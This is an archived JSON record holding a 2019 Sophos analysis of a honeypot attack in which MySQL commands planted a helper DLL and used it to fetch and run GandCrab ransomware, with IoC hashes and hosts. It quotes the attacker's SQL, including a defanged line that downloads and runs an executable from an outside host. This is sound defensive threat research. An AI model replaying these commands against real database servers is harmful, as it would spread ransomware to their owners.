{
    "id": "33de266b-1add-4055-a443-4ce0d0de0720",
    "created_at": "2023-01-12T15:03:09.679426Z",
    "updated_at": "2025-03-27T02:06:01.765114Z",
    "deleted_at": null,
    "sha1_hash": "ae03087481f13416addd7f2f9c02617762b6d9bb",
    "title": "2019-05-24 - Directed attacks against MySQL servers deliver ransomware",
    "authors": "",
    "file_creation_date": "2022-05-27T21:51:12Z",
    "file_modification_date": "2022-05-27T21:51:12Z",
    "file_size": 618440,
    "plain_text": "# Directed attacks against MySQL servers deliver ransomware\n\n**[news.sophos.com/en-us/2019/05/24/gandcrab-spreading-via-directed-attacks-against-mysql-servers/](https://news.sophos.com/en-us/2019/05/24/gandcrab-spreading-via-directed-attacks-against-mysql-servers/)**\n\nAndrew Brandt May 24, 2019\n\nA honeypot we run in a lab environment, listening on the default port used for SQL servers\n(3306/tcp), received an intriguing attack this week from a machine based in the United\nStates. We monitor both the behavior and network traffic generated by this honeypot and\nwere surprised to see the honeypot (which runs under Linux) download a Windows\nexecutable.\n\nThe attacker used SQL database commands first to upload a small helper DLL to the server,\nand then invoked that DLL as a database function to retrieve a GandCrab payload hosted on\nan IP address in Quebec, Canada.\n\nThe “database server”\n\ndownloading GandCrab\nNo harm came to the honeypot, but we felt it was worthwhile to document the nature of the\nattack.\n\n\n-----\n\n## SQL attack explained\n\nThe first stage of the attack involved the attacker connecting to the database server and\nestablishing that it was running MySQL. The honeypot emulates MySQL, so the rest of the\nattack went relatively smoothly.\n\nThe SQL commands issued by the attacker\nNext, the attacker used the “set” command to upload all the bytes that make up the helper\nDLL, in the form of a long string of hexadecimal characters, into memory in a variable.\n\nThe\n\nhelper DLL is input into the database like a really long entry\nThen the attacker wrote out the contents of that variable to a database table it created,\nnamed yongger2.\n\nThe attacker then issued a command to the server to concatenate those bytes into one file,\nand drop them into the server’s plugin directory. We also observed several commands used\nto swap forward slash and backslash characters that seemed designed to make an end-run\naround security features.\n\nHelper DLL’s internal functions\n\nThe DLL appears to add three functions to the database, named xpdl3, xpdl3_deinit, and\n**xpdl3_init and has been observed to be a component file in a lot of malicious toolkits that**\nhave been previously uploaded to services like VirusTotal.\n\n\n-----\n\nThe helper DLL is included\n\nin a number of archives containing malicious toolkits that have been uploaded to VirusTotal\nThe attacker issues SQL commands to drop the yongger2 table, deleting the record of the\nfile’s trajectory through the server, and also to drop the function named xpdl3, if one already\nexists. Finally, it uses uses the following SQL command to create a new database function\n(also called xpdl3) that invokes the DLL:\n```\nCREATE FUNCTION xpdl3 RETURNS STRING SONAME 'cna12.dll'\n\n```\nHaving delivered the helper DLL into the database server’s plugin directory and initialized it,\nthe attacker issues this SQL command to the server, invoking the newly-added xpdl3\nfunction:\n```\nselect xpdl3('hxxp://172.96.14.134:5471/3306-1[.]exe','c:\\\\isetup.exe')\n\n```\n(NOTE: this has been modified to make it harder to accidentally click the link, which was still\nlive at the time of publication.)\n\n\n-----\n\nThe sequence of network events as shown in Wireshark\nIf everything works (which in this case it did), the database server downloads the GandCrab\npayload from the remote machine and drops it in the root of the C: drive with the name\nisetup.exe and executes it.\n\n## How prevalent are these attacks?\n\nAttacks against database servers aren’t new; We’ve [written about them in the past and will](https://news.sophos.com/en-us/2019/04/30/a-taste-of-the-onslaught-at-the-networks-edge/)\nprobably continue to write about them in the future.\n\nThis particular attack transpired over just a few seconds at about midday, local time, on\nSunday, May 19th. Had this attack taken place against an actual MySQL server, that\nmachine would be encrypted by now and the owner of that server would be in some trouble.\n\n\n-----\n\nThe open directory is hosted\n\nusing HFS, with a Chinese user interface\nBut the URL where the file originated bears some scrutiny. It pointed to an open directory on\n[a web server running server software called HFS, which is a Windows-based web server in](http://www.rejetto.com/hfs/)\nthe form of a single application.\n\nWhat makes this interesting is that the IP address of this machine hosting the GandCrab\nsample geolocates to Arizona, in the desert southwest region of the United States, and the\nuser interface of the HFS installation on this machine is in simplified Chinese. The other thing\nthat’s interesting about it is that it shows how many times someone has downloaded any file\nhosted on this server.\n\nThe open directory showed five Windows executable files with names that start with “3306” –\nall of the ones with a hyphen in the filename are, in fact, renamed versions of the same file.\nOnly the file named “3306.exe” is different from the rest. (The use of 3306 as the filename is\nprobably not coincidental.) The directory also contained a malicious Linux ELF executable\nnamed RDP that was not used in this attack.\n\n\n-----\n\nThe “RDP” file is one of many, many examples of related DDoS capable Linux Trojans\n(screen: Virustotal)\nThe server appears to indicate more than 500 downloads of the sample I saw the MySQL\nhoneypot download (3306-1.exe). However, the samples named 3306-2.exe, 3306-3.exe,\nand 3306-4.exe are identical to that file. Counted together, there has been nearly 800\ndownloads in the five days since they were placed on this server, as well as more than 2300\ndownloads of the other (about a week older) GandCrab sample in the open directory.\n\nSo while this isn’t an especially massive or widespread attack, it does pose a serious risk to\nMySQL server admins who have poked a hole through the firewall for port 3306 on their\ndatabase server to be reachable by the outside world.\n\nSophos products will detect the Gandcrab samples as Troj/Kryptik-JG. The DLL helper file\nis detected as Mal/DownLdr-AC.\n\n## IoCs\n\n### GandCrab samples\n\nc83bf900eb759e5de5c8b0697a101ce81573874a440ac07ae4ecbc56c4f69331\n\n017b236bf38a1cf9a52fc0bdee2d5f23f038b00f9811c8a58b8b66b1c756b8d6\n\n### “cna12.dll” helper\n\n1f86561ca8ff302df2a64e6d12ff530bb461f9a93cf9b7c074699e834f59ef44\n\n### Hosts\n\n\n-----\n\n172.96.14.134:5471 (GandCrab host)\n\n148.72.171.83 (MySQL attacker)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-24 - Directed attacks against MySQL servers deliver ransomware.pdf"
    ],
    "report_names": [
        "2019-05-24 - Directed attacks against MySQL servers deliver ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535789,
    "ts_updated_at": 1743041161,
    "ts_creation_date": 1653688272,
    "ts_modification_date": 1653688272,
    "files": {
        "pdf": "https://archive.orkl.eu/ae03087481f13416addd7f2f9c02617762b6d9bb.pdf",
        "text": "https://archive.orkl.eu/ae03087481f13416addd7f2f9c02617762b6d9bb.txt",
        "img": "https://archive.orkl.eu/ae03087481f13416addd7f2f9c02617762b6d9bb.jpg"
    }
}